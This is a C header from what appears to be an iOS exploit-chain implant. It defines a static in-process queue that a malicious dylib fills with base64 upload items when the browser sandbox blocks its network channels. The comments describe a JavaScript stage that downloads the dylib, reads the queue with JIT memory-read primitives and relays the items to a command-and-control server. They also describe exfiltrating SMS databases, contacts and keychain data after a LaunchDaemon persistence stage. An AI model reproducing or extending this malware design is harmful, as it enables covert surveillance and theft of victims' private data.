#ifndef CRU_QUEUE_H
#define CRU_QUEUE_H

#include <stdint.h>

/*
 * cru_queue.h — Channel D in-memory upload queue.
 *
 * When the WebContent sandbox blocks all outbound network channels
 * (C → JSContext fetch, B → raw socket, A → NSURLSession), the dylib
 * falls back to writing upload items into a static in-process queue.
 *
 * Stage3_VariantB.js locates the exported symbols _g_cru_q_cnt and
 * _g_cru_q via the dylib's LC_SYMTAB after downloading code.dylib,
 * then reads the queue with its JIT memory-read primitives after
 * _process() returns, and relays each item to the C2 via fetch()
 * (WebKit's own networking — always permitted inside WebContent).
 *
 * ┌─────────────────────────────────────────────────────────────────┐
 * │ Layout (no implicit padding; verified by static sizes below)    │
 * │  CruQueueItem {                                                  │
 * │    volatile uint32_t rdy;           /* 1 = data ready          │
 * │    char              b64[CRU_Q_B64MAX]; /* base64 JSON body NUL │
 * │  }                                                               │
 * │  g_cru_q_cnt  : volatile uint32_t  — item count (written last) │
 * │  g_cru_q[]    : CruQueueItem[CAP]  — upload queue              │
 * └─────────────────────────────────────────────────────────────────┘
 *
 * Write protocol (dylib, cru_queue_push):
 *   1. strnlen check — reject if ≥ CRU_Q_B64MAX
 *   2. acquire spin-lock
 *   3. idx = g_cru_q_cnt  (check < CRU_Q_CAP)
 *   4. memcpy b64 into g_cru_q[idx].b64
 *   5. __sync_synchronize()  (store-store barrier)
 *   6. g_cru_q[idx].rdy = 1
 *   7. __sync_synchronize()
 *   8. g_cru_q_cnt = idx + 1  (publish: Stage3 sees this item)
 *   9. release spin-lock
 *
 * Read protocol (Stage3 JS, after _process() returns):
 *   cnt = ep.read32(qCntAddr)
 *   for i in 0..cnt:
 *     if ep.read32(g_cru_q[i].rdy_addr) == 1:
 *       read b64 string 4 bytes at a time
 *       fetch('/upload', {body: atob(b64)})
 *
 * Capacity:
 *   CRU_Q_B64MAX = 1024  → fits ~750 B JSON (beacon, device_info, thread_start)
 *   CRU_Q_CAP    = 32   → 32 × 1028 B ≈ 32 KB static BSS
 *
 * Large harvest items (SMS DB, contacts, keychain) exceed CRU_Q_B64MAX
 * and are silently dropped by cru_queue_push(); they are exfiltrated
 * after the persistence (LaunchDaemon) stage where Channel B is open.
 */

#define CRU_Q_B64MAX  1024   /* max base64 chars per item (≈ 750 B JSON)   */
#define CRU_Q_CAP     32     /* slot count; 32 × 1028 B ≈ 32 KB static BSS */

typedef struct {
    volatile uint32_t rdy;           /* 1 = ready to read, 0 = empty/pending */
    char              b64[CRU_Q_B64MAX]; /* base64-encoded JSON POST body      */
} CruQueueItem;

/* sizeof(CruQueueItem) must equal 4 + CRU_Q_B64MAX = 1028.
 * Stage3 hard-codes CRU_ITEM_SZ = 1028n; keep in sync. */

/* Exported — Stage3 resolves these via _g_cru_q_cnt / _g_cru_q in LC_SYMTAB. */
__attribute__((visibility("default")))
extern volatile uint32_t g_cru_q_cnt;

__attribute__((visibility("default")))
extern CruQueueItem g_cru_q[CRU_Q_CAP];

/*
 * cru_queue_push — write one upload item to the queue (thread-safe).
 *
 * b64json: NUL-terminated base64 string of the full JSON POST body.
 * Returns 1 on success, 0 if queue full or string length ≥ CRU_Q_B64MAX.
 */
int cru_queue_push(const char *b64json);

#endif /* CRU_QUEUE_H */
